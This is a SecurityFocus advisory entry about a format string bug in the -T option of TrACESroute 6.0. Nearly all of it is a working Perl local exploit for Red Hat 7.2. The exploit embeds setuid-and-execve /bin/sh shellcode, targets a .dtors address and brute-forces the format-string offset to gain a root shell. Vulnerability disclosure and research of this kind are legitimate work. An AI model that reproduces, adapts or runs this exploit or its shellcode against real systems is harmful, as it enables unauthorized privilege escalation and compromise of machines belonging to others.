source: http://www.securityfocus.com/bid/4956/info

A format string vulnerability exists in TrACESroute. The problem exists in the terminator (-T) function of the program. Due to improper use of the fprintf function, an attacker may be able to supply a malicious format string to the program that reults in writing of attacker-supplied values to arbitrary locations in memory.

#!/usr/bin/perl

## ---/ tracesex.pl /---------------------------------------------------
##
## TrACESroute 6.0 GOLD local format string exploit
##   * tested on Red Hat Linux release 7.2 (Enigma)
##   * Jun 12 2002
##
## Author: stringz // thc@drug.org
## Vulnerability discovered by: downbload // downbload@hotmail.com
##
## Developed on the Snosoft Cerebrum test bed. - http://www.snosoft.com
##
## Greets: g463, syphix, S (super), KF, vacuum, dageshi, sozni,
##         obscure, jove, rachel, kevin, and all of my 2e2h friends.
##
## ---/ powered by pot /-----------------------------------------------

# setuid + execve shellcode
$kode =
  "\x31\xdb".                 # xor ebx, ebx
  "\xf7\xe3".                 # mul ebx
  "\xb0\x17".                 # mov al, 0x17
  "\xcd\x80".                 # int 0x80
  "\x31\xc0".                 # xor  eax, eax
  "\x99".                     # cdq
  "\x52".                     # push edx
  "\x68\x2f\x2f\x73\x68".     # push dword 0x68732f2f
  "\x68\x2f\x62\x69\x6e".     # push dword 0x6e69622f
  "\x89\xe3".                 # mov  ebx, esp
  "\x52".                     # push edx
  "\x53".                     # push ebx
  "\x89\xe1".                 # mov  ecx, esp
  "\xb0\x0b".                 # mov  al, 0x0b
  "\xcd\x80";                 # int  0x80

$vuln    = "./tr";  # CHANGE THIS!@#$%!
$dtors   = 0x804e48c + 4;;

printf("\n-- TrACESroute 6.0 GOLD local format string exploit\n");
printf("-- Author: stringz // thc\@drug.org\n\n");
printf("-- Vulnerability discovered by: downbload // downbload\@hotmail.com\n");

$ret_addr = 0xc0000000 - 4
    - (length($vuln) + 1)
    - (length($kode) + 1)
    ;

undef(%ENV); $ENV{'1337'} = $kode;

printf("overwriting %#.08x with %#.08x\n", $dtors, $ret_addr);
printf("bruteforcing distance (1 .. 300)\n");
sleep(2);

for (1 .. 300) {
    $fmt_str = sw_fmtstr_create($dtors, $ret_addr, $_);
    die("\x0a") if (system("$vuln -T $fmt_str localhost"))
        =~ m/^(0|256|512|32512)$/; # may need a tweak ;)
}

sub
sw_fmtstr_create ($$$)
{
    die("Incorrect number of arguments for sw_fmtstr_create")
        unless @_ == 3;

    my ($dest_addr, $ret_addr, $dist) = @_;
    my ($word, $qword) = (2, 8);

    # $dest_addr = where to write $ret_addr
    # $ret_addr  = where to return execution
    # $dist      = the calculated distance

    $tmp1  = (($ret_addr >> 16) & 0xffff);
    $tmp2  = $ret_addr & 0xffff;

    if ($tmp1 < $tmp2) {
        $high = $tmp1 - $qword;
        $low  = $tmp2 - $high - $qword;

        $dest_addr1 = pack('L', $dest_addr + $word);
        $dest_addr2 = pack('L', $dest_addr);
    }
    else {
        $high = $tmp2 - $qword;
        $low  = $tmp1 - $high - $qword;

        $dest_addr1 = pack('L', $dest_addr);
        $dest_addr2 = pack('L', $dest_addr + $word);
    }

    sprintf("%.4s%.4s%%%uu%%%u\$hn%%%uu%%%u\$hn",
            $dest_addr1, $dest_addr2, $high, $dist,
            $low, $dist + 1);
}